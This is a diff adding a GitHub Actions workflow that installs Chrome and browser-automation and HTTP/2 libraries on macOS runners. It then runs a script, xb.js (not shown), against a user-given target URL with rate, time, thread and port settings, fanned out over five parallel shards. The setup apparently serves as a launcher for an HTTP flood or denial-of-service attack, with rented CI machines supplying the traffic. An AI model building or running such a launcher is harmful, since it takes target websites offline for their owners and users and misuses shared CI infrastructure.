@@ -1,0 +1,57 @@
+name: Run xb.js (macOS)
+
+on:
+  workflow_dispatch:
+    inputs:
+      url:
+        description: "Target URL"
+        required: true
+        type: string
+      rate:
+        description: "Rate"
+        required: true
+        type: number
+      time:
+        description: "Time"
+        required: true
+        type: number
+      threads:
+        description: "Threads"
+        required: true
+        type: number
+      port:
+        description: "Port"
+        required: true
+        type: number
+      data:
+        description: "Request body (optional)"
+        required: false
+        type: string
+      method:
+        description: "HTTP Method (optional)"
+        required: false
+        type: string
+
+jobs:
+  run:
+    runs-on: macos-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1,2,3,4,5]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      - run: npm install puppeteer-real-browser hpack
+      - name: Install Google Chrome (macOS)
+        run: |
+          brew update
+          brew install --cask google-chrome
+      - name: Set environment variables
+        run: |
+          echo "CHROME_PATH=/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" >> $GITHUB_ENV
+          echo "PUPPETEER_EXECUTABLE_PATH=/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" >> $GITHUB_ENV
+      - run: chmod +x xb.js
+      - run: node xb.js "${{ inputs.url }}" "${{ inputs.time }}" "${{ inputs.rate }}" "${{ inputs.threads }}" "${{ inputs.port }}"
